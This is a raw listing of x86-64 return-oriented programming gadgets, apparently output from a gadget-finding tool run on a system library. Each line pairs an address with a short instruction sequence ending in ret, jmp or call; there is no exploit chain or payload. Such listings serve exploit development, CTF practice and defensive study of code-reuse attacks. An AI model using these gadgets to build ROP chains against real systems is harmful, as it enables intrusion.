0x00002aaaaac26f73 : mov qword ptr [rdi - 0x11], r11 ; mov qword ptr [rdi - 9], rcx ; mov byte ptr [rdi - 1], dl ; ret
0x00002aaaaac26ebf : mov qword ptr [rdi - 0x11], r11 ; mov qword ptr [rdi - 9], rcx ; mov dword ptr [rdi - 4], edx ; ret
0x00002aaaaac27047 : mov qword ptr [rdi - 0x12], r11 ; mov qword ptr [rdi - 0xa], rcx ; mov dword ptr [rdi - 4], edx ; ret
0x00002aaaaac27227 : mov qword ptr [rdi - 0x13], r11 ; mov qword ptr [rdi - 0xb], rcx ; mov dword ptr [rdi - 4], edx ; ret
0x00002aaaaac27417 : mov qword ptr [rdi - 0x14], r11 ; mov qword ptr [rdi - 0xc], rcx ; mov dword ptr [rdi - 4], edx ; ret
0x00002aaaaac2704b : mov qword ptr [rdi - 0xa], rcx ; mov dword ptr [rdi - 4], edx ; ret
0x00002aaaaac2f217 : mov qword ptr [rdi - 0xa], rdx ; mov dword ptr [rdi - 4], ecx ; ret
0x00002aaaaac2722b : mov qword ptr [rdi - 0xb], rcx ; mov dword ptr [rdi - 4], edx ; ret
0x00002aaaaac2f197 : mov qword ptr [rdi - 0xb], rdx ; mov dword ptr [rdi - 4], ecx ; ret
0x00002aaaaac2741b : mov qword ptr [rdi - 0xc], rcx ; mov dword ptr [rdi - 4], edx ; ret
0x00002aaaaac2f117 : mov qword ptr [rdi - 0xc], rdx ; mov dword ptr [rdi - 4], ecx ; ret
0x00002aaaaac275ec : mov qword ptr [rdi - 0xd], rcx ; mov qword ptr [rdi - 8], rdx ; ret
0x00002aaaaac2f088 : mov qword ptr [rdi - 0xd], rdx ; mov qword ptr [rdi - 8], rcx ; ret
0x00002aaaaac277ec : mov qword ptr [rdi - 0xe], rcx ; mov qword ptr [rdi - 8], rdx ; ret
0x00002aaaaac2eff8 : mov qword ptr [rdi - 0xe], rdx ; mov qword ptr [rdi - 8], rcx ; ret
0x00002aaaaac279ec : mov qword ptr [rdi - 0xf], rcx ; mov qword ptr [rdi - 8], rdx ; ret
0x00002aaaaac2ef68 : mov qword ptr [rdi - 0xf], rdx ; mov qword ptr [rdi - 8], rcx ; ret
0x00002aaaaab7b1b0 : mov qword ptr [rdi - 1], rdx ; ret
0x00002aaaaab1da27 : mov qword ptr [rdi - 8], r8 ; shl r9, cl ; mov qword ptr [rdi - 0x10], r9 ; ret
0x00002aaaaab1d9b9 : mov qword ptr [rdi - 8], r9 ; ret
0x00002aaaaac26cc8 : mov qword ptr [rdi - 8], rcx ; ret
0x00002aaaaac26d06 : mov qword ptr [rdi - 8], rdx ; ret
0x00002aaaaac26e7b : mov qword ptr [rdi - 9], r8 ; mov dword ptr [rdi - 4], edx ; ret
0x00002aaaaac26f77 : mov qword ptr [rdi - 9], rcx ; mov byte ptr [rdi - 1], dl ; ret
0x00002aaaaac26ec3 : mov qword ptr [rdi - 9], rcx ; mov dword ptr [rdi - 4], edx ; ret
0x00002aaaaac2f297 : mov qword ptr [rdi - 9], rdx ; mov dword ptr [rdi - 4], ecx ; ret
0x00002aaaaab29d85 : mov qword ptr [rdi], r13 ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret
0x00002aaaaab29cb3 : mov qword ptr [rdi], r14 ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; ret
0x00002aaaaab1d9b3 : mov qword ptr [rdi], r8 ; shl r9, cl ; mov qword ptr [rdi - 8], r9 ; ret
0x00002aaaaab1dabd : mov qword ptr [rdi], r8 ; shr r9, cl ; mov qword ptr [rdi + 8], r9 ; ret
0x00002aaaaab68ee6 : mov qword ptr [rdi], r9 ; pop rbx ; ret
0x00002aaaaab1d988 : mov qword ptr [rdi], r9 ; ret
0x00002aaaaabd3634 : mov qword ptr [rdi], rax ; mov qword ptr [rdi + 8], rsi ; ret
0x00002aaaaab1f60a : mov qword ptr [rdi], rax ; mov rax, rdi ; ret
0x00002aaaaabc858e : mov qword ptr [rdi], rax ; mov rdi, rbx ; call 0x1f7f8
0x00002aaaaab0b55a : mov qword ptr [rdi], rax ; xor eax, eax ; ret
0x00002aaaaab7b816 : mov qword ptr [rdi], rcx ; lea rax, qword ptr [rdi + 8] ; ret
0x00002aaaaab7c646 : mov qword ptr [rdi], rcx ; mov byte ptr [rdi + 8], dl ; lea rax, qword ptr [rdi + 9] ; ret
0x00002aaaaab7aed6 : mov qword ptr [rdi], rcx ; mov byte ptr [rdi + 8], dl ; ret
0x00002aaaaab7e0b6 : mov qword ptr [rdi], rcx ; mov byte ptr [rdi + 8], dl ; xor ch, ch ; mov byte ptr [rdi + 9], ch ; ret
0x00002aaaaab7b846 : mov qword ptr [rdi], rcx ; mov dword ptr [rdi + 7], edx ; lea rax, qword ptr [rdi + 0xa] ; ret
0x00002aaaaab7c686 : mov qword ptr [rdi], rcx ; mov dword ptr [rdi + 7], edx ; lea rax, qword ptr [rdi + 0xb] ; ret
0x00002aaaaab7a226 : mov qword ptr [rdi], rcx ; mov dword ptr [rdi + 7], edx ; ret
0x00002aaaaab7e0f6 : mov qword ptr [rdi], rcx ; mov dword ptr [rdi + 7], edx ; xor ch, ch ; mov byte ptr [rdi + 0xb], ch ; ret
0x00002aaaaab7b866 : mov qword ptr [rdi], rcx ; mov dword ptr [rdi + 8], edx ; lea rax, qword ptr [rdi + 0xb] ; ret
0x00002aaaaab7c6a6 : mov qword ptr [rdi], rcx ; mov dword ptr [rdi + 8], edx ; lea rax, qword ptr [rdi + 0xc] ; ret
0x00002aaaaab7a236 : mov qword ptr [rdi], rcx ; mov dword ptr [rdi + 8], edx ; ret
0x00002aaaaab7e116 : mov qword ptr [rdi], rcx ; mov dword ptr [rdi + 8], edx ; xor ch, ch ; mov byte ptr [rdi + 0xc], ch ; ret
0x00002aaaaab7b887 : mov qword ptr [rdi], rcx ; mov qword ptr [rdi + 5], rdx ; lea rax, qword ptr [rdi + 0xc] ; ret
0x00002aaaaab7c6c7 : mov qword ptr [rdi], rcx ; mov qword ptr [rdi + 5], rdx ; lea rax, qword ptr [rdi + 0xd] ; ret
0x00002aaaaab7a247 : mov qword ptr [rdi], rcx ; mov qword ptr [rdi + 5], rdx ; ret
0x00002aaaaab7b8a7 : mov qword ptr [rdi], rcx ; mov qword ptr [rdi + 6], rdx ; lea rax, qword ptr [rdi + 0xd] ; ret
0x00002aaaaab7c6e7 : mov qword ptr [rdi], rcx ; mov qword ptr [rdi + 6], rdx ; lea rax, qword ptr [rdi + 0xe] ; ret
0x00002aaaaab7a257 : mov qword ptr [rdi], rcx ; mov qword ptr [rdi + 6], rdx ; ret
0x00002aaaaab7b8c7 : mov qword ptr [rdi], rcx ; mov qword ptr [rdi + 7], rdx ; lea rax, qword ptr [rdi + 0xe] ; ret
0x00002aaaaab7c707 : mov qword ptr [rdi], rcx ; mov qword ptr [rdi + 7], rdx ; lea rax, qword ptr [rdi + 0xf] ; ret
0x00002aaaaab7a267 : mov qword ptr [rdi], rcx ; mov qword ptr [rdi + 7], rdx ; ret
0x00002aaaaab6376a : mov qword ptr [rdi], rcx ; mov qword ptr [rdi + rdx - 8], rcx ; ret
0x00002aaaaab7c667 : mov qword ptr [rdi], rcx ; mov word ptr [rdi + 8], dx ; lea rax, qword ptr [rdi + 0xa] ; ret
0x00002aaaaab7b827 : mov qword ptr [rdi], rcx ; mov word ptr [rdi + 8], dx ; lea rax, qword ptr [rdi + 9] ; ret
0x00002aaaaab7a217 : mov qword ptr [rdi], rcx ; mov word ptr [rdi + 8], dx ; ret
0x00002aaaaaaf49c2 : mov qword ptr [rdi], rcx ; ret
0x00002aaaaab7b803 : mov qword ptr [rdi], rdx ; lea rax, qword ptr [rdi + 7] ; ret
0x00002aaaaab7c633 : mov qword ptr [rdi], rdx ; lea rax, qword ptr [rdi + 8] ; ret
0x00002aaaaab7b1d0 : mov qword ptr [rdi], rdx ; mov byte ptr [rdi + 8], dl ; ret
0x00002aaaaab7b1f0 : mov qword ptr [rdi], rdx ; mov dword ptr [rdi + 7], edx ; ret
0x00002aaaaab7b200 : mov qword ptr [rdi], rdx ; mov dword ptr [rdi + 8], edx ; ret
0x00002aaaaab7b210 : mov qword ptr [rdi], rdx ; mov qword ptr [rdi + 5], rdx ; ret
0x00002aaaaab7b220 : mov qword ptr [rdi], rdx ; mov qword ptr [rdi + 6], rdx ; ret
0x00002aaaaab7b1e0 : mov qword ptr [rdi], rdx ; mov word ptr [rdi + 8], dx ; ret
0x00002aaaaab7322f : mov qword ptr [rdi], rdx ; ret
0x00002aaaaab7e0a3 : mov qword ptr [rdi], rdx ; xor ch, ch ; mov byte ptr [rdi + 8], ch ; ret
0x00002aaaaab1f07c : mov qword ptr [rdi], rsi ; mov dword ptr [rdx], eax ; mov eax, 1 ; ret
0x00002aaaaab73fdd : mov qword ptr [rdi], rsi ; mov qword ptr [r9 - 8], rcx ; ret
0x00002aaaaac21f4d : mov qword ptr [rdi], rsi ; mov qword ptr [rdi + rdx - 8], rcx ; ret
0x00002aaaaab1f0a2 : mov qword ptr [rdi], rsi ; ret
0x00002aaaaab42cb6 : mov qword ptr [rdx + 0x130], rcx ; ret
0x00002aaaaab4d4b4 : mov qword ptr [rdx + 0x130], rdi ; pop rbx ; ret
0x00002aaaaab460cd : mov qword ptr [rdx + 0x20], rax ; mov dword ptr [rcx], edi ; mov eax, edi ; ret
0x00002aaaaab46273 : mov qword ptr [rdx + 0x20], rsi ; mov dword ptr [rcx], eax ; ret
0x00002aaaaac02bff : mov qword ptr [rdx + 0x20], rsi ; ret
0x00002aaaaac02bdb : mov qword ptr [rdx + 0x58], rdi ; mov qword ptr [rdx + 0x68], rcx ; ret
0x00002aaaaac02bdf : mov qword ptr [rdx + 0x68], rcx ; ret
0x00002aaaaac3f51a : mov qword ptr [rdx + 5], rax ; lea rax, qword ptr [rdx + 0xc] ; ret
0x00002aaaaac3b18a : mov qword ptr [rdx + 5], rax ; mov rax, rdi ; ret
0x00002aaaaac3f53a : mov qword ptr [rdx + 6], rax ; lea rax, qword ptr [rdx + 0xd] ; ret
0x00002aaaaac3b1aa : mov qword ptr [rdx + 6], rax ; mov rax, rdi ; ret
0x00002aaaaac3f55a : mov qword ptr [rdx + 7], rax ; lea rax, qword ptr [rdx + 0xe] ; ret
0x00002aaaaac3b1ca : mov qword ptr [rdx + 7], rax ; mov rax, rdi ; ret
0x00002aaaaab40413 : mov qword ptr [rdx + 8], r8 ; add dword ptr [rdx + 4], 1 ; ret
0x00002aaaaac3f3ea : mov qword ptr [rdx + 8], rax ; lea rax, qword ptr [rdx + 0xf] ; ret
0x00002aaaaac3b0ba : mov qword ptr [rdx + 8], rax ; mov rax, rdi ; ret
0x00002aaaaac06740 : mov qword ptr [rdx + 8], rdi ; ret
0x00002aaaaab693d6 : mov qword ptr [rdx], r12 ; mov rax, r11 ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaac3f393 : mov qword ptr [rdx], rax ; lea rax, qword ptr [rdx + 7] ; ret
0x00002aaaaac0680a : mov qword ptr [rdx], rax ; mov eax, 1 ; ret
0x00002aaaaac3b063 : mov qword ptr [rdx], rax ; mov rax, rdi ; ret
0x00002aaaaab0319c : mov qword ptr [rdx], rax ; ret
0x00002aaaaab4b2de : mov qword ptr [rdx], rax ; xor eax, eax ; pop rbx ; ret
0x00002aaaaab46f85 : mov qword ptr [rdx], rcx ; mov edx, dword ptr [rax] ; mov eax, edx ; pop rbx ; ret
0x00002aaaaab73174 : mov qword ptr [rdx], rcx ; ret
0x00002aaaaabbbf1a : mov qword ptr [rdx], rdi ; ret
0x00002aaaaac0673d : mov qword ptr [rdx], rsi ; mov qword ptr [rdx + 8], rdi ; ret
0x00002aaaaac4872e : mov qword ptr [rip + 0x25200b], rbx ; jne 0x173722 ; pop rbx ; ret
0x00002aaaaac15185 : mov qword ptr [rip + 0x284284], rdx ; add rsp, 8 ; ret
0x00002aaaaabf4a9e : mov qword ptr [rip + 0x2a4dbb], rax ; add rsp, 8 ; ret
0x00002aaaaabe9ef7 : mov qword ptr [rip + 0x2b2222], rax ; pop rbp ; ret
0x00002aaaaabdd96f : mov qword ptr [rip + 0x2ba8ca], rbx ; pop rbx ; ret
0x00002aaaaabd2904 : mov qword ptr [rip + 0x2c6e95], rax ; mov rdx, rax ; jmp 0xfd8a8
0x00002aaaaabd286e : mov qword ptr [rip + 0x2c6f2b], rax ; add rsp, 8 ; ret
0x00002aaaaabd3ef9 : mov qword ptr [rip + 0x2c71f0], rax ; add rsp, 8 ; ret
0x00002aaaaabd3e6c : mov qword ptr [rip + 0x2c727d], rdx ; add rsp, 8 ; ret
0x00002aaaaab61c25 : mov qword ptr [rip + 0x338c5c], rax ; add rsp, 8 ; ret
0x00002aaaaab5caef : mov qword ptr [rip + 0x33dd22], rdx ; add rsp, 0x18 ; ret
0x00002aaaaab51c14 : mov qword ptr [rip + 0x348b49], 0 ; ret
0x00002aaaaaaf4927 : mov qword ptr [rip + 0x3a89da], rdx ; pop rax ; pop rbx ; pop rbp ; ret
0x00002aaaaabbccc3 : mov qword ptr [rsi + 0x10], r8 ; ret
0x00002aaaaab0fbff : mov qword ptr [rsi + 0x10], r9 ; mov qword ptr [rsi + 0x28], rax ; xor eax, eax ; ret
0x00002aaaaac01d1e : mov qword ptr [rsi + 0x10], rax ; ret
0x00002aaaaab10295 : mov qword ptr [rsi + 0x10], rax ; xor eax, eax ; ret
0x00002aaaaab0fc03 : mov qword ptr [rsi + 0x28], rax ; xor eax, eax ; ret
0x00002aaaaab4cf35 : mov qword ptr [rsi + 0x28], rcx ; mov byte ptr [rdx], dil ; ret
0x00002aaaaabd05e6 : mov qword ptr [rsi + 0x48], rax ; ret
0x00002aaaaabca2ae : mov qword ptr [rsi + 0x78], rax ; xor eax, eax ; ret
0x00002aaaaabbcca6 : mov qword ptr [rsi + 8], 0 ; ret
0x00002aaaaac01cee : mov qword ptr [rsi + 8], rax ; ret
0x00002aaaaabbccbf : mov qword ptr [rsi + 8], rcx ; mov qword ptr [rsi + 0x10], r8 ; ret
0x00002aaaaab1d033 : mov qword ptr [rsi + rax*8], rdx ; xor eax, eax ; pop rbx ; ret
0x00002aaaaab4c83a : mov qword ptr [rsi], rax ; xor eax, eax ; ret
0x00002aaaaabf79ce : mov qword ptr [rsi], rcx ; xor eax, eax ; ret
0x00002aaaaabf7462 : mov qword ptr [rsi], rdi ; ret
0x00002aaaaabed770 : mov qword ptr [rsi], rdi ; xor eax, eax ; ret
0x00002aaaaab56147 : mov qword ptr [rsp + 0x10], r8 ; call rdi
0x00002aaaaab56030 : mov qword ptr [rsp + 0x10], r8 ; xor edi, edi ; call qword ptr [rax]
0x00002aaaaac00c06 : mov qword ptr [rsp + 0x18], r10 ; lea r9, qword ptr [rsp + 0x2c] ; call qword ptr [rax]
0x00002aaaaab56142 : mov qword ptr [rsp + 0x18], rax ; mov qword ptr [rsp + 0x10], r8 ; call rdi
0x00002aaaaabb85cd : mov qword ptr [rsp + 0x18], rdx ; call 0x1f8a7
0x00002aaaaab55d0e : mov qword ptr [rsp + 0x20], r10 ; call qword ptr [rax]
0x00002aaaaab5608a : mov qword ptr [rsp + 0x20], r10 ; call rax
0x00002aaaaab56085 : mov qword ptr [rsp + 0x28], r8 ; mov qword ptr [rsp + 0x20], r10 ; call rax
0x00002aaaaac003bc : mov qword ptr [rsp + 0x28], r9 ; call 0x137647
0x00002aaaaab085d8 : mov qword ptr [rsp + 0x28], rcx ; call 0x1f8a7
0x00002aaaaabc850a : mov qword ptr [rsp + 0x40], rax ; call 0x1f7f7
0x00002aaaaabb60b7 : mov qword ptr [rsp + 0x40], rdi ; add rax, rdx ; jmp rax
0x00002aaaaab90657 : mov qword ptr [rsp + 0xb8], r14 ; call r12
0x00002aaaaac0f8bc : mov qword ptr [rsp + 8], r8 ; lea rsi, qword ptr [rsp + 0x18] ; call qword ptr [rax]
0x00002aaaaab5d66f : mov qword ptr [rsp + 8], rax ; call qword ptr [rdx]
0x00002aaaaabd7155 : mov qword ptr [rsp + 8], rax ; call rbx
0x00002aaaaac106fb : mov qword ptr [rsp + 8], rax ; xor eax, eax ; call rdx
0x00002aaaaab1f1ce : mov qword ptr [rsp - 8], rdx ; movsd xmm0, qword ptr [rsp - 8] ; ret
0x00002aaaaab5d9df : mov qword ptr [rsp], rax ; call qword ptr [rdx]
0x00002aaaaabfe922 : mov qword ptr [rsp], rcx ; call r12
0x00002aaaaab52720 : mov qword ptr fs:[r9], rdx ; mov rax, rdx ; add rsp, 8 ; ret
0x00002aaaaac0c62e : mov qword ptr fs:[rax], rdx ; ret
0x00002aaaaab0f5f8 : mov qword ptr fs:[rbp], rdx ; call rax
0x00002aaaaac0c67d : mov qword ptr fs:[rbx], rax ; pop rbx ; ret
0x00002aaaaab0319b : mov qword ptr fs:[rdx], rax ; ret
0x00002aaaaac21f4c : mov qword ptr ss:[rdi], rsi ; mov qword ptr [rdi + rdx - 8], rcx ; ret
0x00002aaaaac579bd : mov r10d, 0xcac982a4 ; call 0xffffffffaedac83f
0x00002aaaaac579bc : mov r10d, 0xcac982a4 ; call 0xffffffffaedac840
0x00002aaaaabfab5e : mov r11, rax ; mov byte ptr [r11], 0 ; ret
0x00002aaaaab34809 : mov r12, r15 ; mov ebx, 2 ; jmp 0x5bafa
0x00002aaaaaaf53f7 : mov r12, rax ; call 0xa9fd9
0x00002aaaaaba3959 : mov r12, rdi ; je 0xce97a ; call 0x8ab77
0x00002aaaaaba95b3 : mov r12, rdi ; xor eax, eax ; mov rdx, r8 ; jmp 0xd45de
0x00002aaaaabb60b4 : mov r12, rsi ; mov qword ptr [rsp + 0x40], rdi ; add rax, rdx ; jmp rax
0x00002aaaaab738cc : mov r12, rsi ; sub rsp, 8 ; call 0x8ab79
0x00002aaaaab528a7 : mov r12, rsi ; xor edi, edi ; mov r13, rdx ; call qword ptr [r15]
0x00002aaaaab3c492 : mov r12d, 2 ; jmp 0x63704
0x00002aaaaac0c97b : mov r12d, dword ptr [rax] ; jmp 0x13798b
0x00002aaaaabd6c43 : mov r12d, edx ; mov rbp, rax ; call rax
0x00002aaaaab83027 : mov r13, r15 ; setne dl ; jmp 0xae03d
0x00002aaaaab85948 : mov r13, r15 ; setne dl ; jmp 0xb095d
0x00002aaaaab880ff : mov r13, r15 ; setne dl ; jmp 0xb311d
0x00002aaaaac0c978 : mov r13, rax ; mov r12d, dword ptr [rax] ; jmp 0x13798e
0x00002aaaaab528ac : mov r13, rdx ; call qword ptr [r15]
0x00002aaaaabfea24 : mov r13, rsp ; call r15
0x00002aaaaabd2579 : mov r13b, byte ptr [r8 + r8] ; lea rax, qword ptr [rip + 0x2c8a14] ; ret
0x00002aaaaab3a978 : mov r13d, eax ; jmp 0x653d6
0x00002aaaaabd75e8 : mov r13d, ebx ; mov rax, qword ptr [rbp - 0x48] ; call rax
0x00002aaaaab34b80 : mov r14, qword ptr [rbp - 0x5f0] ; mov dword ptr fs:[rax], edi ; jmp 0x5fb59
0x00002aaaaab377ff : mov r14, qword ptr [rbp - 0x5f0] ; mov dword ptr fs:[rax], edi ; jmp 0x627d8
0x00002aaaaab35454 : mov r14, qword ptr [rbp - 0x5f0] ; mov dword ptr fs:[rcx], eax ; jmp 0x6042d
0x00002aaaaac69590 : mov r15b, 0xfd ; call rcx
0x00002aaaaabfe6b9 : mov r8, rbp ; mov rcx, r14 ; mov rdi, r13 ; call r12
0x00002aaaaabd36d6 : mov r8, rdi ; mov byte ptr [r8 - 1], 0 ; ret
0x00002aaaaabc037d : mov r8b, 0 ; add byte ptr [rax], al ; add byte ptr [rax - 0x77], cl ; ret 0x894c
0x00002aaaaab9699a : mov r8d, dword ptr [r15 + 0x10] ; jmp 0xc17f4
0x00002aaaaab80a6c : mov r8d, dword ptr [rdi + rax*4] ; test r8d, r8d ; jne 0xaba4a ; ret
0x00002aaaaab1cbb5 : mov r9, qword ptr [rdi + 0x30] ; mov rdi, qword ptr [rdi + 0x68] ; xor eax, eax ; ret
0x00002aaaaab1cf45 : mov r9, qword ptr [rsi + 0x30] ; mov rsi, qword ptr [rsi + 0x70] ; xor eax, eax ; ret
0x00002aaaaaaf685a : mov r9, r14 ; call rbx
0x00002aaaaab81d6c : mov r9, r15 ; call rbx
0x00002aaaaab72e7d : mov r9d, r9d ; movsxd r9, dword ptr [rax + r9*4] ; add rax, r9 ; jmp rax
0x00002aaaaab72ddd : mov r9d, r9d ; movsxd rax, dword ptr [r10 + r9*4] ; add r10, rax ; jmp r10
0x00002aaaaaba03fb : mov rax, -0xe ; ret
0x00002aaaaab81533 : mov rax, -1 ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaab4d330 : mov rax, -1 ; pop rbx ; ret
0x00002aaaaab0a3e6 : mov rax, -1 ; ret
0x00002aaaaab803c0 : mov rax, 1 ; ret
0x00002aaaaab803d0 : mov rax, 2 ; ret
0x00002aaaaab803e0 : mov rax, 3 ; ret
0x00002aaaaab803f0 : mov rax, 4 ; ret
0x00002aaaaab80400 : mov rax, 5 ; ret
0x00002aaaaab80410 : mov rax, 6 ; ret
0x00002aaaaab80420 : mov rax, 7 ; ret
0x00002aaaaabe6fa4 : mov rax, qword ptr [r12 + 0x38] ; jmp 0x111f74
0x00002aaaaaba07e9 : mov rax, qword ptr [r12 + 8] ; test rax, rax ; je 0xcb7ff ; call rax
0x00002aaaaac0cde8 : mov rax, qword ptr [r15 + 8] ; mov rsi, rbx ; mov rdi, r15 ; call qword ptr [rax]
0x00002aaaaabda688 : mov rax, qword ptr [rax + 0x108] ; ret
0x00002aaaaac1792e : mov rax, qword ptr [rax + 0x128] ; jmp rax
0x00002aaaaab496ab : mov rax, qword ptr [rax + 0x130] ; mov rax, qword ptr [rax + 0x20] ; jmp rax
0x00002aaaaabde02f : mov rax, qword ptr [rax + 0x18] ; add dword ptr [rax], 1 ; ret
0x00002aaaaab46fbb : mov rax, qword ptr [rax + 0x18] ; add rsp, 8 ; pop rbx ; pop rbp ; jmp rax
0x00002aaaaabddddf : mov rax, qword ptr [rax + 0x18] ; add word ptr [rax], 1 ; ret
0x00002aaaaab5023b : mov rax, qword ptr [rax + 0x18] ; jmp rax
0x00002aaaaabd17e7 : mov rax, qword ptr [rax + 0x18] ; test rax, rax ; je 0xfc7fc ; ret
0x00002aaaaab47221 : mov rax, qword ptr [rax + 0x20] ; jmp rax
0x00002aaaaab47069 : mov rax, qword ptr [rax + 0x28] ; jmp rax
0x00002aaaaabe8de8 : mov rax, qword ptr [rax + 0x30] ; ret
0x00002aaaaab50707 : mov rax, qword ptr [rax + 0x40] ; jmp rax
0x00002aaaaac093c3 : mov rax, qword ptr [rax + 0x40] ; mov qword ptr [rsi + 0x10], rax ; ret
0x00002aaaaab448c2 : mov rax, qword ptr [rax + 0x48] ; add rsp, 0x10 ; pop rbx ; jmp rax
0x00002aaaaab44b70 : mov rax, qword ptr [rax + 0x48] ; jmp rax
0x00002aaaaab02f11 : mov rax, qword ptr [rax + 0x48] ; mov eax, dword ptr [rax + rdi*4 + 0x200] ; ret
0x00002aaaaab49f73 : mov rax, qword ptr [rax + 0x4c] ; ret
0x00002aaaaac09c63 : mov rax, qword ptr [rax + 0x50] ; mov qword ptr [rsi + 0x10], rax ; ret
0x00002aaaaab02ef1 : mov rax, qword ptr [rax + 0x58] ; mov eax, dword ptr [rax + rdi*4 + 0x200] ; ret
0x00002aaaaabda680 : mov rax, qword ptr [rax + 0x58] ; ret
0x00002aaaaac06639 : mov rax, qword ptr [rax + 0xa0] ; mov qword ptr [rsi + 0x10], rax ; ret
0x00002aaaaac0eec4 : mov rax, qword ptr [rax + 8] ; jmp rax
0x00002aaaaabda678 : mov rax, qword ptr [rax + 8] ; ret
0x00002aaaaab5da1a : mov rax, qword ptr [rax + 8] ; test rax, rax ; jne 0x88a1a ; ret
0x00002aaaaab0001e : mov rax, qword ptr [rax + r14*8] ; test rax, rax ; je 0x2b032 ; call rax
0x00002aaaaab02f14 : mov rax, qword ptr [rax + rdi*4 + 0x200] ; ret
0x00002aaaaab02a1e : mov rax, qword ptr [rax + rdi*8 + 0x80] ; ret
0x00002aaaaab1d1c6 : mov rax, qword ptr [rax + rsi*8] ; mov qword ptr [rcx + rsi*8], rax ; xor eax, eax ; pop rbx ; ret
0x00002aaaaac18206 : mov rax, qword ptr [rax] ; add rax, qword ptr [rdx + 8] ; add rsp, 0x38 ; ret
0x00002aaaaac0eeb9 : mov rax, qword ptr [rax] ; jmp rax
0x00002aaaaab01b6b : mov rax, qword ptr [rax] ; mov eax, dword ptr [rax + 0xa8] ; ret
0x00002aaaaab02a1b : mov rax, qword ptr [rax] ; mov rax, qword ptr [rax + rdi*8 + 0x80] ; ret
0x00002aaaaab02ecb : mov rax, qword ptr [rax] ; movzx eax, word ptr [rax + rdi*2] ; and eax, 1 ; ret
0x00002aaaaab0f722 : mov rax, qword ptr [rax] ; pop rbx ; mov eax, dword ptr [rax + 0x58] ; ret
0x00002aaaaabfce08 : mov rax, qword ptr [rax] ; ret
0x00002aaaaab5306e : mov rax, qword ptr [rax] ; test rax, rax ; je 0x7e080 ; call rax
0x00002aaaaab599b5 : mov rax, qword ptr [rax] ; test rax, rax ; je 0x849c7 ; call rax
0x00002aaaaab528d1 : mov rax, qword ptr [rax] ; test rax, rax ; jne 0x7d90e ; xor edi, edi ; call qword ptr [r15]
0x00002aaaaab3e60c : mov rax, qword ptr [rbp - 0x448] ; jmp 0x65866
0x00002aaaaabd75eb : mov rax, qword ptr [rbp - 0x48] ; call rax
0x00002aaaaaaf72c0 : mov rax, qword ptr [rbp - 0x58] ; call rax
0x00002aaaaab4c490 : mov rax, qword ptr [rbx + 0x20] ; mov qword ptr [rbx + 0x28], rax ; pop rbx ; ret
0x00002aaaaac02b80 : mov rax, qword ptr [rbx + 8] ; mov rsi, rsp ; mov rdi, rbx ; call qword ptr [rax]
0x00002aaaaac0c649 : mov rax, qword ptr [rbx] ; test rax, rax ; je 0x137661 ; pop rbx ; ret
0x00002aaaaac3b186 : mov rax, qword ptr [rcx + 5] ; mov qword ptr [rdx + 5], rax ; mov rax, rdi ; ret
0x00002aaaaac3b1a6 : mov rax, qword ptr [rcx + 6] ; mov qword ptr [rdx + 6], rax ; mov rax, rdi ; ret
0x00002aaaaac3b1c6 : mov rax, qword ptr [rcx + 7] ; mov qword ptr [rdx + 7], rax ; mov rax, rdi ; ret
0x00002aaaaac3b0b6 : mov rax, qword ptr [rcx + 8] ; mov qword ptr [rdx + 8], rax ; mov rax, rdi ; ret
0x00002aaaaac3f390 : mov rax, qword ptr [rcx] ; mov qword ptr [rdx], rax ; lea rax, qword ptr [rdx + 7] ; ret
0x00002aaaaac3b060 : mov rax, qword ptr [rcx] ; mov qword ptr [rdx], rax ; mov rax, rdi ; ret
0x00002aaaaaba09cc : mov rax, qword ptr [rdi + 0x10] ; test rax, rax ; je 0xcb9e3 ; call rax
0x00002aaaaac101ee : mov rax, qword ptr [rdi + 0x18] ; add rsi, rax ; mov qword ptr [rdi + 0x18], rsi ; ret
0x00002aaaaac105f2 : mov rax, qword ptr [rdi + 0x18] ; ret
0x00002aaaaac10190 : mov rax, qword ptr [rdi + 0x18] ; sub rax, qword ptr [rdi + 0x20] ; ret
0x00002aaaaab9cca0 : mov rax, qword ptr [rdi + 0x20] ; ret
0x00002aaaaac48387 : mov rax, qword ptr [rdi + 0x20] ; test rax, rax ; je 0x1733a0 ; call rax
0x00002aaaaac01d36 : mov rax, qword ptr [rdi + 0x28] ; mov qword ptr [rsi + 0x10], rax ; ret
0x00002aaaaab4c4d0 : mov rax, qword ptr [rdi + 0x28] ; sub rax, qword ptr [rdi + 0x20] ; ret
0x00002aaaaac01d6e : mov rax, qword ptr [rdi + 0x40] ; mov qword ptr [rsi + 0x10], rax ; ret
0x00002aaaaab4c3c0 : mov rax, qword ptr [rdi + 0x40] ; sub rax, qword ptr [rdi + 0x38] ; ret
0x00002aaaaab49f70 : mov rax, qword ptr [rdi + 0x48] ; mov eax, dword ptr [rax + 0x4c] ; ret
0x00002aaaaab51b30 : mov rax, qword ptr [rdi + 0x68] ; ret
0x00002aaaaab50234 : mov rax, qword ptr [rdi + 0xd8] ; mov rax, qword ptr [rax + 0x18] ; jmp rax
0x00002aaaaab50700 : mov rax, qword ptr [rdi + 0xd8] ; mov rax, qword ptr [rax + 0x40] ; jmp rax
0x00002aaaaac0f648 : mov rax, qword ptr [rdi + 8] ; lea rsi, qword ptr [rsp + 0x18] ; call qword ptr [rax]
0x00002aaaaac02ab0 : mov rax, qword ptr [rdi + 8] ; lea rsi, qword ptr [rsp + 8] ; call qword ptr [rax]
0x00002aaaaac0ff58 : mov rax, qword ptr [rdi + 8] ; mov rax, qword ptr [rax + 0x40] ; jmp rax
0x00002aaaaac0ff68 : mov rax, qword ptr [rdi + 8] ; mov rax, qword ptr [rax + 0x48] ; jmp rax
0x00002aaaaac0eec0 : mov rax, qword ptr [rdi + 8] ; mov rax, qword ptr [rax + 8] ; jmp rax
0x00002aaaaac0eeb5 : mov rax, qword ptr [rdi + 8] ; mov rax, qword ptr [rax] ; jmp rax
0x00002aaaaac0efa0 : mov rax, qword ptr [rdi + 8] ; mov rsi, rsp ; call qword ptr [rax]
0x00002aaaaac008b6 : mov rax, qword ptr [rdi + 8] ; push 0 ; push 0x19 ; call qword ptr [rax]
0x00002aaaaab5184e : mov rax, qword ptr [rdi] ; mov qword ptr [rdx], rax ; ret
0x00002aaaaabe95b4 : mov rax, qword ptr [rdi] ; mov rdi, rdx ; jmp rax
0x00002aaaaab02eb2 : mov rax, qword ptr [rdx + rax*4 + 0x200] ; ret
0x00002aaaaac021c7 : mov rax, qword ptr [rdx + rax*8] ; jmp rax
